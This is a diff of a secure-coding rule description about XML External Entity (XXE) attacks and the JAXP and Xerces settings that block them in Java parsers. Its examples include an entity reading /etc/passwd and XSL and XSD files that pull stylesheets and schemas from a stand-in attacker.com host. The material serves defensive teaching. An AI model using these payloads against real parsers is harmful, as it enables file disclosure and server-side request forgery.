@@ -1,28 +1,24 @@
 <p><a href="https://www.w3.org/TR/xml/">XML specification</a> allows the use of entities that can be <a
 href="https://www.w3.org/TR/xml/#sec-internal-ent">internal</a> or <a href="https://www.w3.org/TR/xml/#sec-external-ent">external</a> (file system /
-network access ...).</p>
-<p>Allowing access to external entities in XML parsing could lead to vulnerabilities like confidential file disclosures or <a
+network access ...) which could lead to vulnerabilities such as confidential file disclosures or <a
 href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">SSRFs</a>.</p>
-<p>Example in XML document:</p>
+<p>Example in this XML document, an external entity read the /etc/passwd file:</p>
 <pre>
 &lt;?xml version="1.0" encoding="utf-8"?&gt;
   &lt;!DOCTYPE test [
     &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
   ]&gt;
-&lt;note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.attacking.com/deleteall"&gt;
+&lt;note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;
   &lt;to&gt;&amp;xxe;&lt;/to&gt;
   &lt;from&gt;Jani&lt;/from&gt;
   &lt;heading&gt;Reminder&lt;/heading&gt;
   &lt;body&gt;Don't forget me this weekend!&lt;/body&gt;
 &lt;/note&gt;
 </pre>
-<p>Example in XSL document:</p>
+<p>In this XSL document, network access is allowed which can lead to SSRF vulnerabilities:</p>
 <pre>
 &lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE root [
-  &lt;!ENTITY content SYSTEM "file:/etc/passwd"&gt;
-]&gt;
-&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;
+&lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.attacker.com/evil.xsl"&gt;
   &lt;xsl:import href="http://www.attacker.com/evil.xsl"/&gt;
   &lt;xsl:include href="http://www.attacker.com/evil.xsl"/&gt;
  &lt;xsl:template match="/"&gt;
@@ -30,34 +26,17 @@ href="https://www.owasp.org/index.php/Server_Side_Request_Forgery">SSRFs</a>.</p
  &lt;/xsl:template&gt;
 &lt;/xsl:stylesheet&gt;
 </pre>
-<p>Example in XSD document:</p>
-<pre>
-&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE schema PUBLIC "-//W3C//DTD XMLSchema 200102//EN" "" [
-   &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
-  ]&gt;
-&lt;xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"&gt;
-  &lt;xs:import namespace="test" schemaLocation="http://www.attacker.com/evil.xsd"/&gt;
-  &lt;xs:element name="note"&gt;
-    &lt;xs:complexType&gt;
-      &lt;xs:sequence&gt;
-        &lt;xs:element name="to" type="xs:string"/&gt;
-        &lt;xs:element name="from" type="xs:string"/&gt;
-        &lt;xs:element name="heading" type="xs:string"/&gt;
-        &lt;xs:element name="body" type="xs:string"/&gt;
-      &lt;/xs:sequence&gt;
-    &lt;/xs:complexType&gt;
-  &lt;/xs:element&gt;
-&lt;/xs:schema&gt;
-</pre>
+<p>It is recommended to disable access to external entities and network access in general.</p>
 <p>To protect Java XML Parsers from XXE attacks <a
 href="https://docs.oracle.com/en/java/javase/13/security/java-api-xml-processing-jaxp-security-guide.html#GUID-94ABC0EE-9DC8-44F0-84AD-47ADD5340477">these
-properties</a> have been implemented:</p>
+properties</a> have been defined since JAXP 1.5:</p>
 <ul>
   <li> ACCESS_EXTERNAL_DTD: should be set to "" when processing XML/XSD/XLS files (it looks for external DOCTYPEs) </li>
   <li> ACCESS_EXTERNAL_SCHEMA: should be set to "" when processing XML/XSD/XLS files (it looks for external schemalocation ect) </li>
   <li> ACCESS_EXTERNAL_STYLESHEET should be set to "" when processing XLS file (it looks for external imports, includes ect); </li>
 </ul>
+<p>Note that <a href="http://xerces.apache.org/xerces2-j/">Apache Xerces</a> is still based on JAXP 1.4, therefore one solution is to set to
+<code>false</code> the <a href="http://xerces.apache.org/xerces2-j/features.html#external-general-entities">external-general-entities</a> feature.</p>
 <p>Avoid FEATURE_SECURE_PROCESSING feature to protect from XXE attacks because depending on the implementation:</p>
 <ul>
   <li> it has <a
